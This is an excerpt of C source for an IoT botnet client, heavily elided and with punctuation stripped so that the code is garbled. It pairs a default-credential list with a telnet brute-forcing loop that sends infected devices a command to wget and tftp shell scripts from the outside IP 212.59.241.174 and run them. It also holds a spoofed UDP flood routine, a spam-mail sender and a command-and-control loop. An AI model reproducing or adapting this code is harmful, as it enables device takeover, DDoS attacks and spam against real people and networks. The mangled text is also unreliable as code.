...
char usernames[] = {root0, 0, admin0, user0, login0, guest0, user0};
	...
	for (; format != 0; ++format) {
		if (format == '%') {
			...
			if( format == 's' ) {
				...
				pc += prints (out, ss(null), width, pad);
				continue;
			}
			if( format == 'd' ) {
...
int getBogos(unsigned char bogomips)
{
	int cmdline = open(proccpuinfo, O_RDONLY);
	char linebuf[4096];
	while(fdgets(linebuf, 4096, cmdline) != NULL)
	{
		...
		if(strstr(linebuf, BOGOMIPS) == linebuf)
		{
			...
			while(pos[strlen(pos)-1] == 'r'  pos[strlen(pos)-1] == 'n') pos[strlen(pos)-1]=0;
...
int matchPrompt(char bufStr)
{
	...
	{
		while(bufLen  q && ((bufStr + bufLen - q) == 0x00  (bufStr + bufLen - q) == ' '  (bufStr + bufLen - q) == 'r'  (bufStr + bufLen - q) == 'n')) q++;
...
int sclose(int fd)
{
 ...
 __   ___ _ __   ___ _   _ ___ __ _ _ __  _ __   ___ _ __    ___ 
     _   '_   _  __    __ _`  '_  '_   _  '__   _  
      __      __ _  _  (_ (_         __        __ 
     _____ ______ _______,__ __ _____    _____
...
void StartTheLelz()
{
	...
	while(1)
	{
		for(i = 0; i  max; i++)
		{
			...
			case 3
				{
					...
					if(send(fds[i].fd, rn, 2, MSG_NOSIGNAL)  0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 4;
				}
				break;
			...
			case 7
				{
					if(send(fds[i].fd, shrn, 4, MSG_NOSIGNAL)  0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 8;
				}
				break;
			...
			case 9
				{
					if(send(fds[i].fd, binbusybox;echo -e '147141171146147164'rn, 49, MSG_NOSIGNAL)  0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 10;
				}
				break;
			...
			case 101
                                {
                                        if(send(fds[i].fd, cd tmp; wget http212.59.241.174bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 212.59.241.174 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 212.59.241.174; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.shrn, 282, MSG_NOSIGNAL)  0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 102;
                                }
                                break;
...
void sendUDP(unsigned char target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
    ...
    __             __)   __                  
     __               ___    __                 
                               ___ __  __  __ 
   _  _  _     _  _      _    __________ _________ 
...
void sendEmail(unsigned char email, unsigned char host, unsigned char subject, unsigned char message)
{
		...
		if(send(fd, HELO rastrent.comrn, 19, MSG_NOSIGNAL) != 19) { close(fd); return; }
		if(fdgets(buffer, 1024, fd) == NULL) { close(fd); return; }
		if(strstr(buffer, 250 ) == NULL) { close(fd); return; }
		memset(buffer, 0, 1024);

		if(send(fd, MAIL FROM mrras@rastrent.comrn, 33, MSG_NOSIGNAL) != 33) { close(fd); return; }
		if(fdgets(buffer, 1024, fd) == NULL) { close(fd); return; }
		if(strstr(buffer, 250 ) == NULL) { close(fd); return; }
		memset(buffer, 0, 1024);
		...
		if(send(fd, rn, 3, MSG_NOSIGNAL) != 3) { close(fd); return; }
		if(fdgets(buffer, 1024, fd) == NULL) { close(fd); return; }
		if(strstr(buffer, 250 ) == NULL) { close(fd); return; }
		memset(buffer, 0, 1024);

		if(send(fd, DATArn, 6, MSG_NOSIGNAL) != 6) { close(fd); return; }
		if(fdgets(buffer, 1024, fd) == NULL) { close(fd); return; }
		...
		if(send(fd, email, strlen(email), MSG_NOSIGNAL) != strlen(email)) { close(fd); return; }
		if(send(fd, rnFrom mrras@rastrent.comrnSubject , 38, MSG_NOSIGNAL) != 38) { close(fd); return; }
		if(send(fd, subject, strlen(subject), MSG_NOSIGNAL) != strlen(subject)) { close(fd); return; }
		if(send(fd, rnrn, 4, MSG_NOSIGNAL) != 4) { close(fd); return; }
		if(send(fd, message, strlen(message), MSG_NOSIGNAL) != strlen(message)) { close(fd); return; }
		if(send(fd, rn.rn, 5, MSG_NOSIGNAL) != 5) { close(fd); return; }
		if(fdgets(buffer, 1024, fd) == NULL) { close(fd); return; }
		if(strstr(buffer, 250 ) == NULL) { close(fd); return; }
		memset(buffer, 0, 1024);

		send(fd, QUITrn, 6, MSG_NOSIGNAL);
...
int getOurIP()
{
	...
	int cmdline = open(procnetroute, O_RDONLY);
	char linebuf[4096];
	while(fdgets(linebuf, 4096, cmdline) != NULL)
	{
		if(strstr(linebuf, t00000000t) != NULL)
		{
	...
	if(linebuf)
	{
		...
		for (i=0; i6; i++) macAddress[i] = ((unsigned char)ifr.ifr_hwaddr.sa_data)[i];
	}
...
int main(int argc, unsigned char argv[])
{
	...
	getOurIP();
	zprintf(MAC %02X%02X%02X%02X%02X%02Xn, macAddress[0], macAddress[1], macAddress[2], macAddress[3], macAddress[4], macAddress[5]);
	...
	while(1)
	{
		if(initConnection()) { printf(Failed to connect...n); sleep(5); continue; }
		...
		while((got = recvLine(mainCommSock, commBuf, 4096)) != -1)
		{
			...
			if(message == '!')
			{
				...
				while(message[strlen(message) - 1] == 'n'  message[strlen(message) - 1] == 'r') message[strlen(message) - 1] = 0x00;
		...
		printf(Link closed by server.n);
	}
